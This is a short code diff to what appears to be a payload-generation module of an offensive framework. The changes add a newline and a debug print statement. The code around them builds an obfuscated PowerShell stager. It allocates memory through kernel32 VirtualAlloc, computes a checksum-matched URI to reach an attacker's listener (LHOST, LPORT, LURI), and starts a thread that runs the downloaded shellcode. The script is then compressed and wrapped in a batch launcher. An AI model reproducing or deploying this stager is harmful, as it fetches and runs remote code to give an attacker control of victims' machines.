@@ -50,7 +50,7 @@ class PayloadModule:
         baseString = """$q = @"
 [DllImport("kernel32.dll")] public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
 [DllImport("kernel32.dll")] public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
-"@"""
+"@\n"""
         baseString += checks
         baseString += """try{$d = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789".ToCharArray()
 function c($v){ return (([int[]] $v.ToCharArray() | Measure-Object -Sum).Sum %% 0x100 -eq 92)}
@@ -68,6 +68,7 @@ $o::CreateThread(0,0,$x,0,0,0) | out-null; Start-Sleep -Second 86400}catch{}""" 
                                                                               self.required_options["LPORT"][0],
                                                                               "" if self.required_options["LURI"][0] == "/" else "%s/" % self.required_options["LURI"][0])
         baseString += '}\n' * num_ends
+        print(baseString)
         encoded = evasion_helpers.deflate(baseString)
         payload_code = "@echo off\n"
         payload_code += "if %PROCESSOR_ARCHITECTURE%==x86 ("
